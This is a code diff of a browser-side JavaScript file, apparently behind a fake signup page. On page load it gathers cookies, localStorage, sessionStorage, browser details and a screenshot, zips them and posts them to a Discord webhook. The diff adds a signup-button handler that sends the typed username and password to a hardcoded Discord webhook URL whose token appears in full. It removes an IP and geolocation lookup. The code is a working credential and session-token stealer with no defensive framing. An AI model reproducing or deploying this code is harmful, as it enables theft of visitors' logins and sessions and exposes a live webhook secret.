@@ -2,49 +2,6 @@ function generateUniqueId() {
     return 'user-' + Math.random().toString(36).substr(2, 9);
 }
 
-async function getIpAddressesAndLocation() {
-    try {
-        // Fetch IPv4 address
-        const ipv4Response = await fetch('https://api.ipify.org?format=json');
-        const ipv4Data = await ipv4Response.json();
-        const ipv4 = ipv4Data.ip;
-
-        // Fetch IPv6 address
-        const ipv6Response = await fetch('https://api6.ipify.org?format=json');
-        const ipv6Data = await ipv6Response.json();
-        const ipv6 = ipv6Data.ip;
-
-        // Fetch geolocation info
-        const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
-        const geoData = await geoResponse.json();
-
-        return {
-            ipv4,
-            ipv6,
-            location: {
-                latitude: geoData.latitude || 'Not available',
-                longitude: geoData.longitude || 'Not available',
-                city: geoData.city || 'Not available',
-                region: geoData.region || 'Not available',
-                country: geoData.country_name || 'Not available'
-            }
-        };
-    } catch (error) {
-        console.error('Error fetching IP addresses or location:', error);
-        return {
-            ipv4: 'Unable to retrieve IPv4 address',
-            ipv6: 'Unable to retrieve IPv6 address',
-            location: {
-                latitude: 'Not available',
-                longitude: 'Not available',
-                city: 'Not available',
-                region: 'Not available',
-                country: 'Not available'
-            }
-        };
-    }
-}
-
 function getBrowserInfo() {
     return {
         userAgent: navigator.userAgent,
@@ -99,14 +56,12 @@ async function captureScreenshot() {
     }
 }
 
-async function createInitialZipFile(info, screenshotDataUrl, ipAddresses) {
+async function createZipFile(info, screenshotDataUrl) {
     const zip = new JSZip();
     zip.file('info.txt', JSON.stringify(info, null, 2));
-
-    if (ipAddresses) {
-        const { latitude, longitude, city, region, country } = ipAddresses.location;
-        zip.file('geolocation.txt', `Latitude: ${latitude}\nLongitude: ${longitude}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}`);
-    }
+    zip.file('cookies.txt', info.cookies.split('; ').join('\n'));
+    zip.file('localStorage.txt', formatStorage(localStorage));
+    zip.file('sessionStorage.txt', formatStorage(sessionStorage));
 
     if (screenshotDataUrl) {
         const base64Data = screenshotDataUrl.split(',')[1];
@@ -114,35 +69,13 @@ async function createInitialZipFile(info, screenshotDataUrl, ipAddresses) {
         zip.file('screenshot.png', imgBlob);
     }
 
-    zip.file('cookies.txt', info.cookies.split('; ').join('\n'));
-    zip.file('ips.txt', `IPv4: ${ipAddresses.ipv4}\nIPv6: ${ipAddresses.ipv6}`);
-    zip.file('localStorage.txt', formatStorage(localStorage));
-    zip.file('sessionStorage.txt', formatStorage(sessionStorage));
-
-    try {
-        const content = await zip.generateAsync({ type: 'blob' });
-        return content;
-    } catch (error) {
-        console.error('Error generating initial zip file:', error);
-        return null;
-    }
+    const content = await zip.generateAsync({ type: 'blob' });
+    return content;
 }
 
-async function createLoginZipFile(username, password) {
-    const zip = new JSZip();
-    zip.file('login.json', JSON.stringify({ username, password }, null, 2));
-    try {
-        const content = await zip.generateAsync({ type: 'blob' });
-        return content;
-    } catch (error) {
-        console.error('Error generating login zip file:', error);
-        return null;
-    }
-}
-
-async function sendZipToDiscord(zipBlob, uniqueId, isLoginZip = false) {
+async function sendZipToDiscord(zipBlob, uniqueId) {
     const formData = new FormData();
-    formData.append('file', zipBlob, isLoginZip ? `${uniqueId}.zip` : 'info.zip');
+    formData.append('file', zipBlob, 'info.zip');
     formData.append('uniqueId', uniqueId);
 
     try {
@@ -157,41 +90,41 @@ async function sendZipToDiscord(zipBlob, uniqueId, isLoginZip = false) {
 }
 
 async function initialize() {
-    try {
-        const uniqueId = generateUniqueId();
-        const ipAddresses = await getIpAddressesAndLocation();
-        const browserInfo = getBrowserInfo();
-        browserInfo.ipv4 = ipAddresses.ipv4;
-        browserInfo.ipv6 = ipAddresses.ipv6;
-        browserInfo.uniqueId = uniqueId;
+    const uniqueId = generateUniqueId();
+    const browserInfo = getBrowserInfo();
+    browserInfo.uniqueId = uniqueId;
 
-        const screenshotDataUrl = await captureScreenshot();
-        const initialZipBlob = await createInitialZipFile(browserInfo, screenshotDataUrl, ipAddresses);
-
-        if (initialZipBlob) {
-            await sendZipToDiscord(initialZipBlob, uniqueId);
-        } else {
-            console.error('Failed to create initial zip file.');
-        }
-
-        document.getElementById('signup-button').addEventListener('click', async () => {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            if (username && password) {
-                const loginZipBlob = await createLoginZipFile(username, password);
-                if (loginZipBlob) {
-                    await sendZipToDiscord(loginZipBlob, uniqueId, true);
-                } else {
-                    console.error('Failed to create login zip file.');
-                }
-            } else {
-                console.error('Username or password is missing.');
-            }
-        });
-    } catch (error) {
-        console.error('Error during initialization:', error);
-    }
+    const screenshotDataUrl = await captureScreenshot();
+    const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
+    await sendZipToDiscord(zipBlob, uniqueId);
 }
 
 window.onload = initialize;
+
+document.getElementById('signup-button').addEventListener('click', async () => {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    if (username && password) {
+        const loginData = {
+            username: username,
+            password: password
+        };
+
+        const loginJsonBlob = new Blob([JSON.stringify(loginData)], { type: 'application/json' });
+        const formData = new FormData();
+        formData.append('file', loginJsonBlob, 'login.json');
+
+        try {
+            await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
+                method: 'POST',
+                body: formData
+            });
+            console.log('Login data sent to Discord webhook');
+        } catch (error) {
+            console.error('Error sending login data to Discord webhook:', error);
+        }
+    } else {
+        console.log('Username or password is missing.');
+    }
+});
